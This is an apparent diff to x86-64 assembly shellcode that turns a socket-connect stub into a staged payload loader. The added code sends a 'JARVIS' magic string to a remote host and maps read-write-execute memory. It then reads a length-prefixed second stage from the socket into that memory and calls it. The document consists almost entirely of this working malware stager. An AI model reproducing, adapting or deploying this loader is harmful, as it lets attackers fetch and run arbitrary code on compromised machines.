@@ -17,7 +17,7 @@ syscall
 mov r8,rax
 
 ; Create structure
-xor r9,r9
+;xor r9,r9
 push rax
 push rax
 
@@ -34,5 +34,52 @@ mov rax , 42
 syscall
 
 
-LOOP:
-jmp LOOP
+;r8 is the socket opened
+mov rdx, 6
+lea rsi, [r9+MAGIC]
+mov rdi, r8
+mov rax, 1
+syscall
+
+
+;Prevent from wiping regsiters in mmap syscall
+push r8
+push r9
+
+;Adding a mmap syscall
+xor r8,r8
+xor r9,r9
+mov r10 , 0x21
+mov rdx, 7
+mov rsi , 0x10000
+xor rdi,rdi
+mov rax,9
+syscall
+;r10 next stage
+;r9 current base
+;r8 socket descripter
+mov r10,rax
+pop r9
+pop r8
+
+;Get next stage length
+push rax
+mov rdx,8
+mov rsi, rsp
+mov rdi, r8
+xor rax, rax
+syscall
+
+;Length of stage
+pop rdx
+
+
+mov rsi, r10
+mov rdi,r8
+xor rax,rax
+syscall
+
+call r10
+
+MAGIC:
+		db "JARVIS", 0
